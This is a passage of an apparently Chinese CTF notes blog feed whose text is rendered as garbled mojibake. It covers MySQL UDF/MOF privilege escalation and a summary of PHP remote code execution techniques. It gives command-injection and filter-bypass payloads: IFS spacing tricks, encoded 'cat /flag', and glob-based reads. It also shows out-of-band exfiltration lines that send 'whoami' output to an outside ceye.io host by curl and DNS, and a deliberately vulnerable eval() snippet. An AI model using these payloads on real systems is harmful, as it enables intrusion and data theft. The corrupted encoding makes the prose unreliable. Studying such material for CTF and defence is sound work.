åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ä½ç½®</strong>(sqlmapçš„åŠ¨æ€é“¾æ¥åº“éœ€è¦ä½¿ç”¨è‡ªå¸¦è§£ç å·¥å…·cloak.pyè§£ç )</li></ul><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmapæ ¹ç›®å½•/data/udf/mysql</span><br></pre></td></tr></table></figure></div><ul><li><strong>Metasploit çš„ UDF åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ä½ç½®</strong></li></ul><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MSF æ ¹ç›®å½•/embedded/framework/data/exploits/mysql</span><br></pre></td></tr></table></figure></div><p>å¯»æ‰¾æ’ä»¶ç›®å½•</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like <span class="string">&#x27;%plugin%&#x27;</span>;</span><br><span class="line">+---------------+------------------------------+</span><br><span class="line">| Variable_name | Value                        |</span><br><span class="line">+---------------+------------------------------+</span><br><span class="line">| plugin_dir    | /usr/local/mysql/lib/plugin/ |</span><br><span class="line">+---------------+------------------------------+</span><br></pre></td></tr></table></figure></div><p>å†™å…¥åŠ¨æ€æ•°æ®åº“</p><p>å‘ï¼Œå¾…è¡¥</p><h2 id="MOFææƒ"><a href="#MOFææƒ" class="headerlink" title="MOFææƒ"></a>MOFææƒ</h2><p>MOF ææƒæ˜¯ä¸€ä¸ªæœ‰å†å²çš„æ¼æ´ï¼ŒåŸºæœ¬ä¸Šåœ¨ Windows Server 2003 çš„ç¯å¢ƒä¸‹æ‰å¯ä»¥æˆåŠŸã€‚ææƒçš„åŸç†æ˜¯C:&#x2F;Windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;ç›®å½•ä¸‹çš„ mof æ–‡ä»¶æ¯ éš”ä¸€æ®µæ—¶é—´ï¼ˆå‡ ç§’é’Ÿå·¦å³ï¼‰éƒ½ä¼šè¢«ç³»ç»Ÿæ‰§è¡Œï¼Œå› ä¸ºè¿™ä¸ª MOF é‡Œé¢æœ‰ä¸€éƒ¨åˆ†æ˜¯ VBS è„šæœ¬ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨è¿™ä¸ª VBS è„šæœ¬æ¥è°ƒç”¨ CMD æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå¦‚æœ MySQL æœ‰æƒé™æ“ä½œ mof ç›®å½•çš„è¯ï¼Œå°±å¯ä»¥æ¥æ‰§è¡Œä»»æ„å‘½ä»¤äº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCEæ€»ç»“</title>
      <link href="/2022/07/03/RCE%E6%80%BB%E7%BB%93/"/>
      <url>/2022/07/03/RCE%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="RCEæ€»ç»“"><a href="#RCEæ€»ç»“" class="headerlink" title="RCEæ€»ç»“"></a>RCEæ€»ç»“</h1><h2 id="å®šä¹‰"><a href="#å®šä¹‰" class="headerlink" title="å®šä¹‰"></a>å®šä¹‰</h2><p>RCEï¼Œè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œå¯ä»¥è®©æ”»å‡»è€…ç›´æ¥å‘åå°æœåŠ¡å™¨è¿œç¨‹æ³¨å…¥æ“ä½œç³»ç»Ÿå‘½ä»¤æˆ–è€…ä»£ç ï¼Œä»è€Œæ§åˆ¶åå°ç³»ç»Ÿã€‚</p><h2 id="å‘½ä»¤æ‰§è¡Œå‡½æ•°"><a href="#å‘½ä»¤æ‰§è¡Œå‡½æ•°" class="headerlink" title="å‘½ä»¤æ‰§è¡Œå‡½æ•°"></a>å‘½ä»¤æ‰§è¡Œå‡½æ•°</h2><h3 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h3><p>system()å‡½æ•°ä¼šè°ƒç”¨fork()äº§ç”Ÿå­è¿›ç¨‹ï¼Œç”±å­è¿›ç¨‹è°ƒç”¨<code>/bin/sh -c command</code>æ‰§è¡Œç‰¹å®šçš„å‘½ä»¤ï¼Œæš‚åœå½“å‰è¿›ç¨‹ç›´åˆ°commandå‘½ä»¤æ‰§è¡Œå®Œæ¯•ï¼Œå½“æ­¤å‘½ä»¤æ‰§è¡Œå®Œåéšå³è¿”å›åŸè°ƒç”¨çš„è¿›ç¨‹ã€‚</p><p>å½“system()æ­£å¸¸æ‰§è¡Œï¼Œå°†è¿”å›å‘½ä»¤çš„é€€å‡ºç ï¼›</p><p>å½“è¿”å›å€¼ä¸º127ï¼Œç›¸å½“äºæ‰§è¡Œäº†exitå‡½æ•°ï¼Œè€Œè‡ªèº«å‘½ä»¤æ²¡æœ‰æ‰§è¡Œï¼›</p><p>å½“è¿”å›å€¼ä¸º-1ï¼Œä»£è¡¨æ²¡æœ‰æ‰§è¡Œsystemè°ƒç”¨ã€‚</p><h3 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h3><p>system()çš„ä¸åŒä¸»è¦åœ¨äºexec()å¹¶ä¸ä¼šè°ƒç”¨fork()äº§ç”Ÿæ–°è¿›ç¨‹ã€æš‚åœåŸå‘½ä»¤æ¥æ‰§è¡Œæ–°å‘½ä»¤ï¼Œè€Œæ˜¯ç›´æ¥è¦†ç›–åŸå‘½ä»¤ï¼Œå¯¹è¿”å›å€¼æœ‰å½±å“ã€‚</p><p>execæ‰§è¡Œcommandå‘½ä»¤æ—¶ï¼Œä¸ä¼šè¾“å‡ºå…¨éƒ¨ç»“æœï¼Œè€Œæ˜¯è¿”å›ç»“æœçš„æœ€åä¸€è¡Œ</p><blockquote><p>ç»“æœæœ‰å¤šè¡Œæ—¶(å¦‚åˆ—ç›®å½•æ—¶)è¦ä¼ å…¥ç¬¬äºŒä¸ªå‚æ•°æ¥æ”¶ï¼Œè¦æ±‚æ˜¯æ•°ç»„</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&#x27;ls&#x27;</span>,<span class="variable">$arr</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div></blockquote><h3 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a><strong>shell_exec()</strong></h3><p>åœ¨shellä¸‹æ‰§è¡Œï¼Œé€‚ç”¨äºLinux Macosï¼Œå¹¶ä¸”ç»“æœå¯ä»¥æœ‰å¤šè¡Œï¼Œå­—ç¬¦ä¸²æ–¹å¼è¿”å›ï¼Œç»•è¿‡æ‰§è¡Œè¿‡ç¨‹ä¸­å‡ºé”™æˆ–æ— è¾“å‡ºï¼Œè¿”å›NULL</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a><strong>passthru()</strong></h3><p>passthruç›´æ¥å°†ç»“æœè¾“å‡ºï¼Œ<u>ä¸è¿”å›ç»“æœ</u>(ä¸systemçš„åŒºåˆ«)</p><h2 id="ç³»ç»Ÿå‘½ä»¤æ‹¼æ¥æ–¹å¼"><a href="#ç³»ç»Ÿå‘½ä»¤æ‹¼æ¥æ–¹å¼" class="headerlink" title="ç³»ç»Ÿå‘½ä»¤æ‹¼æ¥æ–¹å¼"></a>ç³»ç»Ÿå‘½ä»¤æ‹¼æ¥æ–¹å¼</h2><ul><li>â€œ|â€:ç®¡é“ç¬¦ï¼Œå‰é¢å‘½ä»¤æ ‡å‡†è¾“å‡ºï¼Œåé¢å‘½ä»¤çš„æ ‡å‡†è¾“å…¥ã€‚ä¾‹å¦‚ï¼šhelp | more </li><li>â€œ&amp;â€ commandA &amp; commandB å…ˆè¿è¡Œå‘½ä»¤Aï¼Œç„¶åè¿è¡Œå‘½ä»¤B </li><li>â€œ||â€ commandA || commandB è¿è¡Œå‘½ä»¤Aï¼Œå¦‚æœå¤±è´¥åˆ™è¿è¡Œå‘½ä»¤B </li><li>â€œ&amp;&amp;â€ commandA &amp;&amp; commandB è¿è¡Œå‘½ä»¤Aï¼Œå¦‚æœæˆåŠŸåˆ™è¿è¡Œå‘½ä»¤B</li><li>cmd1 ; cmd2 (; åˆ†å·æ“ä½œç¬¦)æ‰§è¡Œå¤šæ¡å‘½ä»¤</li></ul><h2 id="ç»•è¿‡æŠ€å·§"><a href="#ç»•è¿‡æŠ€å·§" class="headerlink" title="ç»•è¿‡æŠ€å·§"></a>ç»•è¿‡æŠ€å·§</h2><h3 id="phpå­—ç¬¦è¢«è¿‡æ»¤"><a href="#phpå­—ç¬¦è¢«è¿‡æ»¤" class="headerlink" title="phpå­—ç¬¦è¢«è¿‡æ»¤"></a>phpå­—ç¬¦è¢«è¿‡æ»¤</h3><p>ä½¿ç”¨çŸ­æ ‡ç­¾ <code>&lt;?= phpä»£ç  ?&gt; </code></p><h3 id="systemè¢«è¿‡æ»¤"><a href="#systemè¢«è¿‡æ»¤" class="headerlink" title="systemè¢«è¿‡æ»¤"></a>systemè¢«è¿‡æ»¤</h3><p>ä½¿ç”¨åå¼•å·ç»•è¿‡</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span> <span class="keyword">echo</span> `ls /`; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="ç©ºæ ¼è¢«è¿‡æ»¤"><a href="#ç©ºæ ¼è¢«è¿‡æ»¤" class="headerlink" title="ç©ºæ ¼è¢«è¿‡æ»¤"></a>ç©ºæ ¼è¢«è¿‡æ»¤</h3><ul><li><p>å¸¸è§ç»•è¿‡æ–¹å¼æœ‰åˆ©ç”¨URLç¼–ç ï¼š%20ã€%09ï¼ˆtabï¼‰</p></li><li><p>è¿˜æœ‰åˆ©ç”¨<code>$IFS$9</code>ã€<code>$IFS$1</code>ã€<code>$&#123;IFS&#125;</code>ã€<code>$IFS</code>ç­‰å†…éƒ¨åŸŸåˆ†éš”ç¬¦ï¼ˆä¹Ÿæ˜¯IFSçš„ä¸€ç§ï¼Œå› æ­¤æ²¡æœ‰åŒå¼•å·åŒ…è£¹æ—¶è¢«echoä¼šè¢«ç©ºæ ¼æ›¿æ¢ï¼‰</p></li><li><p>{}ä¹Ÿå¯ä»¥ï¼Œæ¯”å¦‚è¿™æ ·{cat,flag}</p></li><li><p>&lt; ã€&lt;&gt;</p></li></ul><blockquote><p>IFS æ˜¯ä¸€ç§ set å˜é‡ï¼Œå½“ shell å¤„ç†â€å‘½ä»¤æ›¿æ¢â€å’Œâ€å‚æ•°æ›¿æ¢â€æ—¶ï¼Œshell æ ¹æ® IFS çš„å€¼ï¼Œé»˜è®¤æ˜¯ space, tab, newline æ¥æ‹†è§£è¯»å…¥çš„å˜é‡ï¼Œç„¶åå¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œå¤„ç†ï¼Œæœ€åé‡æ–°ç»„åˆèµ‹å€¼ç»™è¯¥å˜é‡ã€‚</p><p>IFSé»˜è®¤å€¼ä¸º <space> <tab> <newline>3ä¸ª</p><p>IFSçš„ä½œç”¨å°±æ˜¯æŠŠå­—ç¬¦ä¸²é‡Œçš„æŸæŸå­—ç¬¦ï¼ˆå’Œå®ƒä¸€æ ·çš„å­—ç¬¦ï¼‰è½¬ä¹‰æˆåˆ†éš”ç¬¦ã€‚</p><p>è€Œç©ºæ ¼è¢«å½“ä½œåˆ†éš”ç¬¦æ—¶ä¼šåˆå¹¶ï¼Œå› æ­¤ç›´æ¥echoå«å¤šä¸ªç©ºæ ¼çš„å˜é‡ï¼Œä¼šå»é‡è¿ç»­çš„ç©ºæ ¼ï¼Œè‹¥è¦ä¿ç•™ï¼Œechoæ—¶åŠ ä¸ŠåŒå¼•å·</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;$test&quot;</span><br></pre></td></tr></table></figure></div><p>å¯ä»¥å¯¹IFSé‡æ–°èµ‹å€¼</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">IFS=&#x27;&amp;&#x27;</span><br><span class="line">STRING2=&quot;111&amp;222&amp;&amp;333&amp;&amp;&amp;444&quot;</span><br><span class="line">echo $STRING2   # 111 222  333   444     (æ²¡æœ‰åŒå¼•å·åŒ…è£¹ï¼Œåˆ†éš”ç¬¦ä»¥ç©ºæ ¼æ˜¾ç¤º)</span><br><span class="line">echo &quot;$STRING2&quot;   # 111&amp;222&amp;&amp;333&amp;&amp;&amp;444</span><br></pre></td></tr></table></figure></div></blockquote><blockquote><p>$* æŒ‡çš„æ˜¯è„šæœ¬å…¥å£å‚æ•°çš„å­—ç¬¦ä¸²é›†ï¼Œæ˜¯ä¸€ä¸ªå…¨å±€å˜é‡</p><p>ä½ åœ¨ç»ˆç«¯è¾“å…¥ä¸€ä¸ªè„šæœ¬ï¼Œå¸¦äº†3ä¸ªå‚æ•°ï¼š</p><p><strong># .&#x2F;script 111 222 333</strong></p><p>é‚£ä¹ˆ echo $* è¾“å‡ºçš„å°±æ˜¯111 222 333</p><p>è€Œ$*ç­‰äº111IFS222IFS333IFS444 æ‰€ä»¥ä¼šæ ¹æ®IFSå€¼æ”¹å˜ç»“æœ</p></blockquote><h3 id="æŸäº›å…³é”®å­—è¢«è¿‡æ»¤"><a href="#æŸäº›å…³é”®å­—è¢«è¿‡æ»¤" class="headerlink" title="æŸäº›å…³é”®å­—è¢«è¿‡æ»¤"></a>æŸäº›å…³é”®å­—è¢«è¿‡æ»¤</h3><h4 id="base64ç¼–ç ç»•è¿‡"><a href="#base64ç¼–ç ç»•è¿‡" class="headerlink" title="base64ç¼–ç ç»•è¿‡"></a>base64ç¼–ç ç»•è¿‡</h4><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Y2F0IC9mbGFn&quot;</span>|base64 -d|bash     <span class="comment">//cat /flag</span></span><br></pre></td></tr></table></figure></div><h4 id="å¼•å·ç»•è¿‡"><a href="#å¼•å·ç»•è¿‡" class="headerlink" title="å¼•å·ç»•è¿‡"></a>å¼•å·ç»•è¿‡</h4><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ph<span class="string">&quot;&quot;</span>p  =&gt;  php</span><br><span class="line">ca<span class="string">&#x27;&#x27;</span>t  =&gt;  cat</span><br><span class="line">ca``t  =&gt;  cat</span><br></pre></td></tr></table></figure></div><h4 id="å¶è¯»æ‹¼æ¥ç»•è¿‡"><a href="#å¶è¯»æ‹¼æ¥ç»•è¿‡" class="headerlink" title="å¶è¯»æ‹¼æ¥ç»•è¿‡"></a>å¶è¯»æ‹¼æ¥ç»•è¿‡</h4><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=<span class="number">192.168</span>.<span class="number">0.1</span>;a=l;b=s;$a<span class="variable">$b</span> <span class="comment">//ls</span></span><br></pre></td></tr></table></figure></div><h4 id="åæ–œæ -ç»•è¿‡"><a href="#åæ–œæ -ç»•è¿‡" class="headerlink" title="åæ–œæ  \ ç»•è¿‡"></a>åæ–œæ  \ ç»•è¿‡</h4><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ca\t =&gt; cat</span><br><span class="line">fl\ag =&gt; flag</span><br><span class="line">ph\p =&gt; php</span><br></pre></td></tr></table></figure></div><h4 id="é€šé…ç¬¦ç»•è¿‡"><a href="#é€šé…ç¬¦ç»•è¿‡" class="headerlink" title="é€šé…ç¬¦ç»•è¿‡"></a>é€šé…ç¬¦ç»•è¿‡</h4><p>[<a class="link"   href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" >æ— å­—æ¯æ•°å­—webshellä¹‹æé«˜ç¯‡ | ç¦»åˆ«æ­Œ (leavesongs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>]</p><p><a class="link"   href="https://www.freebuf.com/articles/network/279563.html" >[è€ç”Ÿå¸¸è°ˆçš„æ— å­—æ¯æ•°å­— Webshell æ€»ç»“ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·] <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">shellä¸‹å¯ä»¥åˆ©ç”¨.æ¥æ‰§è¡Œä»»æ„è„šæœ¬</span><br><span class="line">Linuxæ–‡ä»¶åæ”¯æŒç”¨globé€šé…ç¬¦ä»£æ›¿</span><br><span class="line">/?url=<span class="number">192.168</span>.<span class="number">0.1</span>|cat%<span class="number">09</span>/fla?</span><br><span class="line">/?url=<span class="number">192.168</span>.<span class="number">0.1</span>|cat%<span class="number">09</span>/fla*</span><br><span class="line">å‡è®¾flagåœ¨/flagä¸­:</span><br><span class="line">/?url=<span class="number">127.0</span>.<span class="number">0.1</span>|ca<span class="string">&quot;&quot;</span>t%<span class="number">09</span>/fla?</span><br><span class="line">/?url=<span class="number">127.0</span>.<span class="number">0.1</span>|ca<span class="string">&quot;&quot;</span>t%<span class="number">09</span>/fla*</span><br><span class="line">    </span><br><span class="line">å‡è®¾flagåœ¨/flag.txtä¸­:</span><br><span class="line">/?url=<span class="number">127.0</span>.<span class="number">0.1</span>|ca<span class="string">&quot;&quot;</span>t%<span class="number">09</span>/fla????</span><br><span class="line">/?url=<span class="number">127.0</span>.<span class="number">0.1</span>|ca<span class="string">&quot;&quot;</span>t%<span class="number">09</span>/fla*</span><br><span class="line">    </span><br><span class="line">å‡è®¾flagåœ¨/flags/flag.txtä¸­:</span><br><span class="line">/?url=<span class="number">127.0</span>.<span class="number">0.1</span>|ca<span class="string">&quot;&quot;</span>t%<span class="number">09</span>/fla??/fla????</span><br><span class="line">/?url=<span class="number">127.0</span>.<span class="number">0.1</span>|ca<span class="string">&quot;&quot;</span>t%<span class="number">09</span>/fla*/fla*</span><br><span class="line">  </span><br><span class="line">/bin/ca? a*Hello!</span><br></pre></td></tr></table></figure></div><blockquote><p>è¿™é‡Œè¦æ³¨æ„ï¼Œä½ ä½¿ç”¨çš„å‘½ä»¤è¡¥å…¨æ—¶ä¼šä¸ä¼šå­˜åœ¨æ­§ä¹‰ï¼Œæ¯”å¦‚caè¡¥å…¨æ—¶ï¼Œä¸‰ä¸ªå­—æ¯çš„æœ‰<code>cal</code>å’Œ<code>cat</code>ä¸¤ç§</p><p>calçš„è·¯å¾„å’Œcatçš„è·¯å¾„å®Œå…¨ä¸ä¸€æ ·ï¼Œè¿™ä¹Ÿæ˜¯è¿™é‡Œä¸ºä»€ä¹ˆè¦æŒ‡å®šè·¯å¾„çš„ç¼˜æ•…</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032329169.jpg"                      alt="image-20220815032641305"                ><figcaption>image-20220815032641305</figcaption></figure></p></blockquote><p><strong>Hexç¼–ç ç»•è¿‡</strong></p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;636174202f666c6167&quot;|xxd -r -p|bash     å°†æ‰§è¡Œcat /flag</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">(<span class="built_in">printf</span> <span class="string">&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;</span>)         æ‰§è¡Œ<span class="built_in">cat</span> /flag</span></span><br><span class="line">&#123;printf,&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;&#125;|$0       æ‰§è¡Œcat /flag</span><br></pre></td></tr></table></figure></div><p><strong>Octç¼–ç ç»•è¿‡</strong></p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">(<span class="built_in">printf</span> <span class="string">&quot;\154\163&quot;</span>)       æ‰§è¡Œ<span class="built_in">ls</span></span></span><br></pre></td></tr></table></figure></div><p><strong>å†…è”æ‰§è¡Œç»•è¿‡</strong></p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;a`pwd`&quot;          #è¾“å‡ºa/root</span><br><span class="line">?ip=127.0.0.1;cat$IFS$9`ls`</span><br></pre></td></tr></table></figure></div><p><strong>[]åŒ¹é…ç»•è¿‡</strong></p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c[a]t  =&gt;  cat</span><br><span class="line">mo[r]e  =&gt;  more  </span><br><span class="line">in[d]ex  =&gt;  index</span><br><span class="line">p[h]p  =&gt;  php</span><br></pre></td></tr></table></figure></div><h4 id="å­—ç¬¦ä¸²æ‹¼æ¥"><a href="#å­—ç¬¦ä¸²æ‹¼æ¥" class="headerlink" title="å­—ç¬¦ä¸²æ‹¼æ¥"></a>å­—ç¬¦ä¸²æ‹¼æ¥</h4><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=c;b=at;c=a;d=txt;$a$b $c.$da=c;b=at;c=a;d=txt;$a$b $&#123;c&#125;.$&#123;d&#125;  # cat a.txt</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Hello!</span></span><br></pre></td></tr></table></figure></div><h4 id="åˆ©ç”¨ç¯å¢ƒå˜é‡å–å€¼"><a href="#åˆ©ç”¨ç¯å¢ƒå˜é‡å–å€¼" class="headerlink" title="åˆ©ç”¨ç¯å¢ƒå˜é‡å–å€¼"></a><strong>åˆ©ç”¨ç¯å¢ƒå˜é‡å–å€¼</strong></h4><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032329605.jpg"                      alt="image-20220815031943830"                ><figcaption>image-20220815031943830</figcaption></figure></p><blockquote><p>:3:1  ä¸‹æ ‡ä¸º3çš„å­—ç¬¦å¼€å§‹æ‰“å°ä¸€ä¸ªå­—ç¬¦ï¼Œæ€»çš„ä¹Ÿæ˜¯ä¸€ä¸ªå­—ç¬¦ï¼Œä¸‹æ ‡ä»0å¼€å§‹</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sh-3.2# echo $&#123;SHELLOPTS&#125;</span><br><span class="line">braceexpand:emacs:hashall:histexpand:history:interactive-comments:monitor:posix</span><br><span class="line">sh-3.2# echo $&#123;SHELLOPTS:1:10&#125;</span><br><span class="line">raceexpand</span><br></pre></td></tr></table></figure></div></blockquote><h4 id="ä½¿ç”¨ç©ºå˜é‡"><a href="#ä½¿ç”¨ç©ºå˜é‡" class="headerlink" title="ä½¿ç”¨ç©ºå˜é‡"></a><strong>ä½¿ç”¨ç©ºå˜é‡</strong></h4><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c<span class="variable">$&#123;z&#125;</span>at a.txt</span><br></pre></td></tr></table></figure></div><h4 id="æ— å›æ˜¾ç»•è¿‡"><a href="#æ— å›æ˜¾ç»•è¿‡" class="headerlink" title="æ— å›æ˜¾ç»•è¿‡"></a>æ— å›æ˜¾ç»•è¿‡</h4><p>å¤–å¸¦ä¿¡æ¯ï¼Œè®¿é—®vps,ç„¶åå»æ—¥å¿—ä¸­æŸ¥æ‰¾</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl vps:port/`whoami`</span><br></pre></td></tr></table></figure></div><p>æˆ–è€…åŠ ä¸Šç¼–ç ä¹Ÿå¯</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 34kk35.ceye.io/$(<span class="built_in">whoami</span> | <span class="built_in">base64</span>)</span><br></pre></td></tr></table></figure></div><p><strong>ä½¿ç”¨DNS</strong></p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig `<span class="built_in">whoami</span>`.34kk35.ceye.io</span><br></pre></td></tr></table></figure></div><h2 id="æ— æ•°å­—å­—æ¯shell"><a href="#æ— æ•°å­—å­—æ¯shell" class="headerlink" title="æ— æ•°å­—å­—æ¯shell"></a>æ— æ•°å­—å­—æ¯shell</h2><h3 id="åº”ç”¨åœºæ™¯"><a href="#åº”ç”¨åœºæ™¯" class="headerlink" title="åº”ç”¨åœºæ™¯"></a>åº”ç”¨åœºæ™¯</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>è¿‡æ»¤äº†æ•°å­—å­—æ¯å¤§å°å†™ï¼Œæ— æ³•æ­£å¸¸ä¼ ä¸€å¥è¯</p></blockquote><h3 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3><p>å°†éå­—æ¯ã€æ•°å­—çš„å­—ç¬¦ç»è¿‡å„ç§å˜æ¢ï¼Œæœ€åèƒ½æ„é€ å‡ºa-zä¸­ä»»æ„ä¸€ä¸ªå­—ç¬¦ã€‚ç„¶åå†åˆ©ç”¨PHPå…è®¸åŠ¨æ€å‡½æ•°æ‰§è¡Œçš„ç‰¹ç‚¹ï¼Œæ‹¼æ¥å¤„ä¸€ä¸ªå‡½æ•°åï¼Œå¦‚â€œassertâ€ï¼Œç„¶ååŠ¨æ€æ‰§è¡Œä¹‹å³å¯</p><ul><li>php5ä¸­assertæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡<code>$f=&#39;assert&#39;;$f(...);</code>è¿™æ ·çš„æ–¹æ³•æ¥åŠ¨æ€æ‰§è¡Œä»»æ„ä»£ç ã€‚</li><li>ä½†php7ä¸­ï¼Œassertä¸å†æ˜¯å‡½æ•°ï¼Œå˜æˆäº†ä¸€ä¸ªè¯­è¨€ç»“æ„ï¼ˆç±»ä¼¼evalï¼‰ï¼Œä¸èƒ½å†ä½œä¸ºå‡½æ•°ååŠ¨æ€æ‰§è¡Œä»£ç 